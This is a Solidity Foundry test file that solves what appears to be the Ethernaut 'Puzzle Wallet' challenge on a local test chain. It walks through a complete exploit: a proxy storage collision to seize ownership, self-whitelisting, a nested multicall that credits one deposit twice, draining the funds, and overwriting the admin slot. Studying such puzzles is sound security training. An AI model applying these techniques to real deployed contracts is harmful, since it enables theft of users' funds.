// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "@puzzles/24/PuzzleWallet.sol";
import {IPuzzleWallet} from "@puzzles/24/IPuzzleWallet.sol";
import {PuzzleWalletSolution} from "@script/24/PuzzleWalletSolution.s.sol";

contract PuzzleWalletTest is Test {
    PuzzleWallet puzzleWallet;  // only for logic
    PuzzleProxy puzzleProxy;

    address proxyAdmin = makeAddr("proxyAdmin");
    address owner = makeAddr("owner");
    address player = msg.sender;

    uint256 constant MAX_BALANCE = 1 ether;
    uint256 constant INITIAL_BALANCE = 10000;

    function setUp() public {
        puzzleWallet = new PuzzleWallet();
        bytes memory data = abi.encodeWithSignature("init(uint256)", MAX_BALANCE);

        vm.prank(owner);
        puzzleProxy = new PuzzleProxy(proxyAdmin, address(puzzleWallet), data);
        vm.deal(address(puzzleProxy), INITIAL_BALANCE);
    }

    function testPuzzleWallet() public {
        vm.startPrank(player);
        // 1. Becoming the Owner
        puzzleProxy.proposeNewAdmin(player);
        assertEq(IPuzzleWallet(address(puzzleProxy)).owner(), player);
        // 2. Add self to whitelist
        IPuzzleWallet(address(puzzleProxy)).addToWhitelist(player);
        assertEq(IPuzzleWallet(address(puzzleProxy)).whitelisted(player), true);
        // 3. use multicall to do a reentrancy attack to get double balance record in the contract
        bytes memory dataDeposit = abi.encodeWithSignature("deposit()");
        bytes[] memory dataInner = new bytes[](1);
        dataInner[0] = dataDeposit;
        bytes memory dataMultiCall = abi.encodeWithSignature("multicall(bytes[])", dataInner);
        bytes[] memory data = new bytes[](2);
        data[0] = dataMultiCall;
        data[1] = dataDeposit;
        IPuzzleWallet(address(puzzleProxy)).multicall{value: INITIAL_BALANCE}(data);
        console.log("PuzzleProxy balance: %s", address(puzzleProxy).balance);
        console.log("Player balance: %s", IPuzzleWallet(address(puzzleProxy)).balances(player));
        assertEq(IPuzzleWallet(address(puzzleProxy)).balances(player), INITIAL_BALANCE * 2);
        // 4. drain the contract so that the contract balance is 0 (to bypass the setMaxBalance check)
        uint256 playerBalance = IPuzzleWallet(address(puzzleProxy)).balances(player);
        IPuzzleWallet(address(puzzleProxy)).execute(player, playerBalance, "");
        console.log("PuzzleProxy balance: %s", address(puzzleProxy).balance);
        console.log("Player balance: %s", IPuzzleWallet(address(puzzleProxy)).balances(player));
        assertEq(IPuzzleWallet(address(puzzleProxy)).balances(player), 0);
        // 5. claim admin
        IPuzzleWallet(address(puzzleProxy)).setMaxBalance(uint256(uint160(player)));
        assertEq(puzzleProxy.admin(), player);
        vm.stopPrank();
    }

    function testPuzzleWalletSolution() public {
        PuzzleWalletSolution solution = new PuzzleWalletSolution();
        solution.solve(payable(puzzleProxy), player);
        assertEq(IPuzzleWallet(address(puzzleProxy)).owner(), player);
    }
}

